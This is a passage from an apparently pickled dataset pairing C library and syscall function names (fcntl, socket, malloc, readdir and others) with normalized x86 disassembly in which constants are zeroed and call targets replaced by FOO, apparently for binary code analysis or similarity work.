S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EBP,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EBX,0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nINC~EBX\nCMP~EBP,EBX\nJLE~FOO\nCMP~[EBX+ESI-0],0\nJNZ~FOO\nTEST~EBX,EBX\nSETNZ~AL\nAND~EAX,0\nNEG~EAX\nAND~ESI,EAX\nMOV~EAX,ESI\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p197
L83L
tp198
a(S'util_local_addr'
p199
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nMOV~EAX,0\nCMP~ESI,0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nLEA~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p200
L127L
tp201
a(S'fcntl'
p202
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nLEA~EAX,[ECX-0]\nMOV~EDX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nPUSH~EAX\nPUSH~EDX\nPUSH~ECX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p203
L87L
tp204
a(S'fcntl64'
p205
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p206
L63L
tp207
a(S'chdir'
p208
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p209
L46L
tp210
a(S'close'
p211
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p212
L46L
tp213
a(S'fork'
p214
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p215
L38L
tp216
a(S'getpid'
p217
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p218
L38L
tp219
a(S'getppid'
p220
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p221
L38L
tp222
a(S'ioctl'
p223
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p224
L63L
tp225
a(S'kill'
p226
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p227
L50L
tp228
a(S'open'
p229
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nTEST~CL,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOVZX~EDX,AX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p230
L75L
tp231
a(S'prctl'
p232
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p233
L63L
tp234
a(S'read'
p235
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p236
L54L
tp237
a(S'readlink'
p238
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p239
L54L
tp240
a(S'select'
p241
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p242
L63L
tp243
a(S'setsid'
p244
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p245
L38L
tp246
a(S'sigprocmask'
p247
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EDX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nCMP~EDI,0\nJBE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~ESI,0\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p248
L85L
tp249
a(S'time'
p250
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p251
L46L
tp252
a(S'unlink'
p253
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p254
L46L
tp255
a(S'write'
p256
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p257
L54L
tp258
a(S'closedir'
p259
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nCMP~DWORDPTR[EDI],0\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nLEA~EBX,[EDI+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nMOV~EBX,[EDI]\nMOV~DWORDPTR[EDI],0\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nPUSH~[EDI+0]\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p260
L112L
tp261
a(S'opendir'
p262
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nXOR~EBX,EBX\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nTEST~EAX,EAX\nJS~FOO\nPUSH~EBX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EDI\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EAX],EDI\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EBX+0],EAX\nCMP~EAX,0\nJA~FOO\nMOV~[EBX+0],0\nPUSH~EDX\nPUSH~EDX\nPUSH~[EBX+0]\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],EAX\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nXOR~EBX,EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p263
L241L
tp264
a(S'readdir'
p265
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nLEA~EBX,[ESI+0]\nPUSH~EBX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESI+0]\nCMP~EAX,[ESI+0]\nJA~FOO\nPUSH~EDX\nPUSH~[ESI+0]\nPUSH~[ESI+0]\nPUSH~DWORDPTR[ESI]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~[ESI+0],EAX\nMOV~[ESI+0],0\nMOV~EAX,[ESI+0]\nMOV~EBX,EAX\nADD~EBX,[ESI+0]\nMOVZX~EDX,[EBX+0]\nADD~EAX,EDX\nMOV~[ESI+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p266
L132L
tp267
a(S'clock'
p268
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~ESP,0\nIMUL~EAX,,0\nAND~EAX,0\nRETN"'
p269
L36L
tp270
a(S'memmove'
p271
S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,[ESP+0]\nCMP~EAX,ESI\nJNB~FOO\nMOV~EDI,EAX\nMOVSB~,\nJMP~FOO\nLEA~ESI,[ESI+ECX-0]\nLEA~EDI,[EAX+ECX-0]\nSTD\nMOVSB~,\nCLD\nPOP~ESI\nPOP~EDI\nRETN"'
p272
L39L
tp273
a(S'memset'
p274
S'"PUSH~EDI\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nSTOSB~,\nMOV~EAX,[ESP+0]\nPOP~EDI\nRETN"'
p275
L21L
tp276
a(S'inet_addr'
p277
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p278
L37L
tp279
a(S'accept'
p280
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p281
L43L
tp282
a(S'bind'
p283
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p284
L43L
tp285
a(S'connect'
p286
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p287
L43L
tp288
a(S'getsockname'
p289
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p290
L43L
tp291
a(S'getsockopt'
p292
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p293
L59L
tp294
a(S'listen'
p295
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p296
L35L
tp297
a(S'recv'
p298
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p299
L51L
tp300
a(S'recvfrom'
p301
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p302
L67L
tp303
a(S'send'
p304
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p305
L51L
tp306
a(S'sendto'
p307
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p308
L67L
tp309
a(S'setsockopt'
p310
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p311
L59L
tp312
a(S'socket'
p313
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p314
L43L
tp315
a(S'raise'
p316
S'"SUB~ESP,0\nCALL~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nRETN"'
p317
L24L
tp318
a(S'sigaddset'
p319
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJLE~FOO\nCMP~EAX,0\nJG~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nADD~ESP,0\nRETN"'
p320
L42L
tp321
a(S'sigemptyset'
p322
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nXOR~EAX,EAX\nADD~ESP,0\nRETN"'
p323
L25L
tp324
a(S'signal'
p325
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nTEST~EBX,EBX\nJLE~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~[ESP+0],EAX\nMOV~EAX,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nSBB~EAX,EAX\nAND~EAX,0\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p326
L175L
tp327
a(S'__sigismember'
p328
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nDEC~ECX\nMOV~EBX,ECX\nAND~ECX,0\nSHR~EBX,0\nSHL~EAX,CL\nTEST~[EDX+EBX*4],EAX\nPOP~EBX\nSETNZ~AL\nMOVZX~EAX,AL\nRETN"'
p329
L36L
tp330
a(S'__sigaddset'
p331
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nDEC~ECX\nMOV~EDX,ECX\nAND~ECX,0\nSHR~EDX,0\nSHL~EAX,CL\nOR~[EBX+EDX*4],EAX\nXOR~EAX,EAX\nPOP~EBX\nRETN"'
p332
L32L
tp333
a(S'__malloc_largebin_index'
p334
S'"MOV~EDX,EAX\nPUSH~EBX\nSHR~EDX,0\nMOV~EBX,EAX\nCMP~EDX,0\nMOV~EAX,0\nJA~FOO\nBSR~EAX,EDX\nLEA~ECX,[EAX+0]\nSHR~EBX,CL\nAND~EBX,0\nLEA~EAX,[EBX+EAX*4+0]\nPOP~EBX\nRETN"'
p335
L38L
tp336
a(S'malloc'
p337
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EBX,<STR>\nTEST~BL,0\nJNZ~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~[ESP+0],EBX\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nLEA~ECX,[EAX+0]\nMOV~EDX,[ECX-0]\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,[EDX+0]\nMOV~[ECX-0],EAX\nJMP~FOO\nCMP~[ESP+0],0\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nMOV~[ESP+0],EAX\nLEA~ECX,<STR>\nMOV~EDX,[ECX+0]\nCMP~EDX,ECX\nJZ~FOO\nMOV~EBX,[ESP+0]\nMOV~EAX,[EDX+0]\nMOV~[ECX+0],EAX\nOR~[EDX+EBX+0],0\nMOV~[EAX+0],ECX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP+0]\nCALL~FOO\nAND~BL,0\nMOV~[ESP+0],EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDI,[EBP+0]\nMOV~EDX,[EBP+0]\nAND~EDI,0\nCMP~[ESP+0],0\nJA~FOO\nCMP~EDX,0\nJNZ~FOO\nCMP~EBP,<STR>\nJNZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~EDI,EAX\nJA~FOO\nMOV~EAX,0\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nCMP~EDI,[ESP+0]\nJZ~FOO\nCMP~EDI,0\nJA~FOO\nMOV~ESI,EDI\nSHR~ESI,0\nLEA~EBX,<STR>\nMOV~EAX,[EBX+0]\nJMP~FOO\nMOV~EAX,EDI\nCALL~FOO\nMOV~ESI,EAX\nLEA~EAX,<STR>\nMOV~EDX,[EAX+0]\nMOV~[ESP+0],EDX\nMOV~EBX,EDX\nCMP~EDX,EAX\nJZ~FOO\nMOV~EBX,[EAX+0]\nCMP~EDI,[EBX+0]\nJNB~FOO\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EAX,EDI\nOR~EAX,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nMOV~EBX,[ESP+0]\nCMP~EAX,[EBX+0]\nJB~FOO\nMOV~EBX,[EBX+0]\nMOV~EDX,ESI\nAND~ESI,0\nMOV~ECX,ESI\nMOV~EAX,0\nSAR~EDX,0\nSHL~EAX,CL\nOR~<STR>,EAX\nMOV~[EBP+0],EBX\nMOV~ESI,[ESP+0]\nMOV~[EBP+0],ESI\nMOV~[EBX+0],EBP\nMOV~[ESI+0],EBP\nMOV~EBP,<STR>\nCMP~EBP,0\nJNZ~FOO\nCMP~[ESP+0],0\nJBE~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,<STR>\nMOV~EAX,[EDX+0]\nJMP~FOO\nMOV~EBX,[EAX+0]\nMOV~ECX,[EAX+0]\nAND~EBX,0\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[EAX+0]\nCMP~[EDX+0],EAX\nJNZ~FOO\nCMP~[ECX+0],EAX\nJZ~FOO\nCALL~FOO\nMOV~ESI,EBX\nSUB~ESI,[